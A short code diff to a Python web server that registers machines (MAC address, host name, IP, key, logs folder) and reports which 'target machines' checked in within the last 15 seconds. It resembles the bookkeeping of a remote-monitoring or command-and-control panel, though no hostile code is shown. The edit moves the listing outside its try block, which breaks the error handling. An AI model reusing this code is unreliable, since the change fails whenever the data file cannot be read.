@@ -76,7 +76,7 @@ def create_machine():
     serial_number = int(max(data_dict.keys(), default=1000)) + 1
     folder_path = f'logs/machine_{serial_number}'
 
-    data_dict[serial_number] = {'mac address': mac_address, 'host name': host_name, 'ip': ip, 'path': folder_path,"key":key}
+    data_dict[serial_number] = {'mac address': mac_address, 'host name': host_name, 'ip': ip, 'path': folder_path,"key":key,"last_chek":time.time()}
     with open(data_path, 'w', encoding='utf-8') as file:
         json.dump(data_dict, file, ensure_ascii=False, indent=4)
 
@@ -163,9 +163,9 @@ def get_target_machines_list():
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
             data = json.load(f)
-            machines = {sn: {'ip':machine_data['ip'],'name':machine_data['host name'],'active': time.time() - machine_data['last_chek'] < 15} for sn, machine_data in data.items()}
     except Exception as e:
         machines = {}
+    machines = {sn: {'ip':machine_data['ip'],'name':machine_data['host name'],'active': time.time() - machine_data['last_chek'] < 15} for sn, machine_data in data.items()}
 
     try:
         return jsonify(machines), 200
